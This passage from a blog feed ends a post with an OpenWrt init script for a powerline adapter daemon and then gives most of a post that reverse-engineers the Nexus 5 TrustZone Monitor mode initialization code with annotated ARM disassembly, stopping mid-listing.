start_service&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
 procd_open_instance
 procd_set_param &lt;span class="nb"&gt;command&lt;/span&gt; /open-plc-utils/amphost -i eth0.2 -P /plc/plc.ceb.pib -N /plc/plc.nvm
 procd_set_param respawn
 procd_close_instance
&lt;span class="o"&gt;}&lt;/span&gt;
service_triggers&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
 procd_add_reload_trigger &lt;span class="s2"&gt;&amp;quot;amphost&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;/div&gt;
&lt;div&gt;Then, to enable this script at startup:&lt;/div&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ /etc/init.d/amphost &lt;span class="nb"&gt;enable&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;Et voilà !&lt;/div&gt;

&lt;/div&gt;</content><category term="PLC"></category><category term="dhp-1565"></category><category term="AR7400"></category><category term="openwrt"></category></entry><entry><title>Analysis of Nexus 5 Monitor mode</title><link href="https://fredericb.info/2014/12/analysis-of-nexus-5-monitor-mode.html" rel="alternate"></link><published>2014-12-25T13:28:00-08:00</published><updated>2014-12-25T13:28:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-12-25:/2014/12/analysis-of-nexus-5-monitor-mode.html</id><summary type="html">&lt;p&gt;This article will first describe how to locate the Monitor mode
code in Nexus 5 firmware (&lt;a href=
"https://dl.google.com/dl/android/aosp/hammerhead-ktu84p-factory-35ea0277.tgz"&gt;hammerhead-ktu84p-factory-35ea0277&lt;/a&gt;,
bootloader-hammerhead-hhz11k : c32f8bec310c659c1296739b00c6a8ac).
Then, we will try to understand what it does (its functionalities).
Finally, you will have to find bugs by yourself because I didn't
find any...so far !&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: Terms (Non-)Secure …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;This article will first describe how to locate the Monitor mode
code in Nexus 5 firmware (&lt;a href=
"https://dl.google.com/dl/android/aosp/hammerhead-ktu84p-factory-35ea0277.tgz"&gt;hammerhead-ktu84p-factory-35ea0277&lt;/a&gt;,
bootloader-hammerhead-hhz11k : c32f8bec310c659c1296739b00c6a8ac).
Then, we will try to understand what it does (its functionalities).
Finally, you will have to find bugs by yourself because I didn't
find any...so far !&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: Terms (Non-)Secure world &amp;amp; (Non-)Secure state are used as
synonyms. Term Normal world is also used as synonym of Non-Secure
world.&lt;/em&gt;
&lt;h2&gt;I. Quick introduction to ARM Security Extensions&lt;/h2&gt;
"The Security Extensions define two security states: Secure state
and Non-secure state. All instruction execution takes place either
in Secure state or in Non-secure state.[...] The Security
Extensions also define an additional processor mode, Monitor mode,
that provides a bridge between software running in Non-secure state
and software running in Secure state."&lt;br&gt;
"The Secure Monitor Call exception is implemented only as part of
the Security Extensions. The Secure Monitor Call instruction, SMC ,
requests a Secure Monitor function, causing the processor to enter
Monitor mode."&lt;br&gt;
"When an exception is taken, processor execution is forced to an
address that corresponds to the type of exception. This address is
called the exception vector for that exception. A set of exception
vectors comprises eight consecutive word-aligned memory addresses,
starting at an exception base address. These eight vectors form a
vector table."&lt;br&gt;
-- &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Architecture Reference Manual ARMv7-A&lt;/a&gt;&lt;br&gt;
&lt;h2&gt;II. OpenSource TrustZone examples&lt;/h2&gt;
Trusted Execution Environment (TEE) is the "small" secure kernel
executed in Secure state. The Monitor code &lt;a href=
"http://www.arm.com/products/processors/technologies/trustzone/index.php"&gt;
is part of&lt;/a&gt; the TEE code.&lt;br&gt;
To get an idea of how the Monitor code works, we can take a look at
two TrustZone examples:&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.faqs/ka15417.html"&gt;
Cortex-A9 TrustZone example by ARM&lt;/a&gt; : a simple example of secure
and non-secure code that communicates through Monitor mode.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OP-TEE/optee_os"&gt;OP-TEE by
STMicroelectronics&lt;/a&gt; : an Open Source TEE 1.0
implementation.&lt;/li&gt;
&lt;/ul&gt;
After studying these code samples, we can clearly distinguish two
parts in Monitor code:&lt;br&gt;
&lt;h3&gt;Monitor mode initialization:
called once, at TEE initialization time.&lt;/h3&gt;
In this code, we can notice two specific instructions :&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;Monitor Vector Base Address Register (MVBAR) setup: MVBAR
contains the Monitor vector table address. Both samples use the
same instructions to setup MVBAR :&lt;/li&gt;
&lt;li style="list-style: none"&gt;&amp;nbsp; &amp;nbsp; MCR &amp;nbsp; &amp;nbsp; p15,
0, $RX,c12,c0, 1&lt;br&gt;
where $RX is a pointer to the monitor mode's vector table.&lt;br&gt;
&lt;br&gt;&lt;/li&gt;
&lt;li&gt;SP register setup: the Monitor mode stack address is set into
SP register. This register is banked, which means this value will
be automatically restored next time the processor enters in Monitor
mode.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Exception vectors: called when
an exception is taken to Monitor mode.&lt;/h3&gt;
Both samples implement a simple Secure Monitor Call (SMC) handler
that switches between the normal and secure worlds when a SMC call
is made. As SMC handler is an entry point to the Secure state, it
would be interesting to analyze it in Nexus 5 firmware.&lt;br&gt;
&lt;h2&gt;III. Extracting Nexus 5 firmware&lt;/h2&gt;
We know that the Monitor code may be embedded into the TEE image.
In the case of Nexus 5, this image can be extracted from stock
ROM.&lt;br&gt;
Once downloaded, we use a small &lt;a href=
"https://gist.github.com/frederic/cd56923c8af46ae44fd5"&gt;tool to
unpack bootloader-hammerhead-hhz11k.img file&lt;/a&gt;. One of extracted
files is an ELF ARM binary named "tz".&lt;br&gt;
&lt;h2&gt;IV. Nexus 5 Monitor mode code&lt;/h2&gt;
To analyze the Nexus 5 TrustZone binary, we can use &lt;a href=
"https://www.hex-rays.com/products/ida/support/download_demo.shtml"&gt;
IDA Demo 6.6&lt;/a&gt;.&lt;br&gt;
Given that setting up MVBAR is very specific to the monitor mode's
initialization code, we use it to locate the Monitor mode's
initialization code in Nexus 5 TrustZone binary.&lt;br&gt;
Using IDA regex search in code disassembly, we look for the
instruction used to write MVBAR :&lt;br&gt;
&lt;blockquote class="tr_bq" style=
"background-color: white; color: black;"&gt;&lt;span style=
"color: navy; font-family: FixedSys; white-space: pre;"&gt;MCR&lt;/span&gt;[[:space:]]+&lt;span style="color: navy; font-family: FixedSys; white-space: pre;"&gt;p15,&lt;/span&gt;
&lt;span style=
"color: green; font-family: FixedSys; white-space: pre;"&gt;0&lt;/span&gt;&lt;span style="color: navy; font-family: FixedSys; white-space: pre;"&gt;,&lt;/span&gt;
[^,]+&lt;span style=
"color: navy; font-family: FixedSys; white-space: pre;"&gt;,c12,c0,&lt;/span&gt;
&lt;span style=
"color: green; font-family: FixedSys; white-space: pre;"&gt;1&lt;/span&gt;&lt;/blockquote&gt;
This search returns only 3 occurrences, and one of them also sets
the SP register. These instructions are expected to be found in
Monitor mode initialization code.&lt;br&gt;
&lt;h3&gt;IV.1. Monitor mode initialization function&lt;/h3&gt;
Here's the disassembly of the Monitor mode initialization code
:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt; &lt;span class="no"&gt;init_monitor&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xD6 ; switch to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB50&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;monitor_vector_table&lt;/span&gt; &lt;span class="c1"&gt;; load monitor vector table ptr into R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB54&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; write R0 to MVBAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB58&lt;/span&gt;                 &lt;span class="no"&gt;BL&lt;/span&gt;              &lt;span class="no"&gt;sub_FE80DB88&lt;/span&gt; &lt;span class="c1"&gt;; initialize Non-Secure world&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB5C&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0xFE82B700&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB60&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; write MPIDR value to R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB64&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; keep Affinity level 0 : current virtual CPU id&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB68&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x200&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB6C&lt;/span&gt;                 &lt;span class="no"&gt;MUL&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt; &lt;span class="c1"&gt;; compute stack offset for current vCPU&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB70&lt;/span&gt;                 &lt;span class="no"&gt;SUB&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt; &lt;span class="c1"&gt;; setup Monitor stack register SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB74&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0b100&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB78&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; set FIQ flag in SCR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB7C&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; flush the pipeline in the processor&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB80&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xD3 ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB84&lt;/span&gt;                 &lt;span class="no"&gt;BX&lt;/span&gt;              &lt;span class="no"&gt;LR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB84&lt;/span&gt; &lt;span class="c1"&gt;; End of function init_monitor&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;br&gt;
We will now proceed to a detailed analysis of each step.&lt;br&gt;
&lt;h5&gt;IV.1.A Switch to Monitor mode&lt;/h5&gt;
MSR instruction moves an immediate value (here 0xD6) to a Special
register (here CPSR_c).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xD6 ; switch to Monitor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The Current Program Status Register (CPSR) holds processor status
and control information. CPSR with "_c" suffix enables writing of
bits&amp;lt;0:7&amp;gt; of CPSR (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;ARM
Ref.&lt;/a&gt; B9.3.11). This bitfield controls the processor mode and
exception masks.&lt;/p&gt;
&lt;p&gt;We can use a simple IDAPython script to replace the immediate value
0xD6 with symbols documented in &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Ref.&lt;/a&gt; (B1-1148) :&lt;br&gt;
&lt;script src=
"https://gist.github.com/frederic/251c453abc3c520a94be.js"&gt;
&lt;/script&gt;Thus, the instruction becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#CPSR_MODE_MON OR CPSR_MASK_FIQ OR CPSR_MASK_IRQ ; switch to Monitor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This instruction switches the processor to Monitor mode. It also
sets CPSR.F and CPSR.I bits to mask FIQ and IRQ exceptions, meaning
they cannot be taken.
&lt;h5&gt;IV.1.B Setup MVBAR&lt;/h5&gt;
The Move to Coprocessor from ARM core register instruction (MCR)
passes the value of an ARM core register (here R0) to a coprocessor
(here CP15).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB50&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;monitor_vector_table&lt;/span&gt; &lt;span class="c1"&gt;; load monitor vector table ptr into R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB54&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; write R0 to MVBAR&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;CP15 c12 register is present on an ARMv7-A implementation that
includes Security Extensions. This instruction writes R0 value to
MVBAR. R0 contains a pointer to Monitor vector table. We will
describe this table later.
&lt;h5&gt;IV.1.C Initialize Non-Secure world&lt;/h5&gt;
The function&amp;nbsp;sub_FE80DB88 is called to initialize the
Non-Secure world context:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB88&lt;/span&gt; &lt;span class="no"&gt;sub_FE80DB88&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB88&lt;/span&gt;                &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; read Secure SCTLR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB8C&lt;/span&gt;               &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_NS OR SCR_FW OR SCR_AW ; #0x31&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB90&lt;/span&gt;                &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; switch to Non-Secure (NS) state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB94&lt;/span&gt;                &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB98&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write Secure SCTLR value to NS SCTLR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB9C&lt;/span&gt;               &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBA0&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear CSSELR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBA4&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear TTBR0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBA8&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear TTBR1&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBAC&lt;/span&gt;              &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="c1"&gt;; clear TTBCR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBB0&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear DACR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBB4&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear DFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBB8&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear IFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBBC&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear ADFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBC0&lt;/span&gt;              &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear AIFSR&lt;/span&gt;
